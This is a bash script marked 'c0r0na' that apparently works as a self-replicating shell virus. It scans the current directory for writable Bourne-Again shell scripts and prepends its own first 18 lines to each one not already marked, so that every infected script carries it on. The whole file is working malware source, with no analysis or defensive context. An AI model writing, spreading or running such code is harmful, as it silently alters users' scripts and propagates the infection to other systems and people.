#!/bin/bash
#c0r0na
for f in *
do
if [ -f $f -a -w $f ];then
if file $f | grep Bourne-A > /dev/null
then
head -n 2 $f > .a
if grep c0r0na .a > /dev/null
then
rm -f .a
else
cat $f > .a
head -n 18 $0 > $f
cat .a >> $f
rm -f .a
fi;fi;fi
done
